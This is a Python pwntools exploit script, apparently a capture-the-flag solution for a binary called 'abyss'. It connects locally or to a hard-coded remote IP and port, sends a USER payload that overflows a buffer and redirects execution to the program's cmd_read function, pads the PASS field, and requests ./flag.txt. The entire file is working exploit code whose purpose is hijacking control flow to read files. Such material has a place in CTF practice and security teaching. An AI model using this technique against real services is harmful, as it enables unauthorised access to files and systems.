#!/usr/bin/python3

from pwn import *
import argparse
from time import *


parser = argparse.ArgumentParser(description='Exploit script')
parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
args = parser.parse_args()

exe = ELF('./abyss_patched', checksec=False)
#libc = ELF('./libc.so.6', checksec=False)
#ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
#libc = exe.libc

context.binary = exe
context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if args.remote is None:
        gdb.attach(p, gdbscript='''
        b* 0x0000000000401350
        b* 0x00000000004013D5
        b* 0x00000000004014A7
        
        c
        ''')
        input()

if args.remote:
    p = remote('94.237.55.96',43841)  
else:
    p = process(exe.path)  

#GDB()



s(b'\0'*4) #cmd_login
sleep(1)
payload = b'USER ' + b'a'*17
payload += b'\x1c' + b'b'*11
payload += p64(exe.sym.cmd_read + 66) 
s(payload)
sleep(3)
payload = b"PASS " + b"c"*507
s(payload)
sleep(1)
payload = b"./flag.txt\0"
s(payload)



p.interactive()




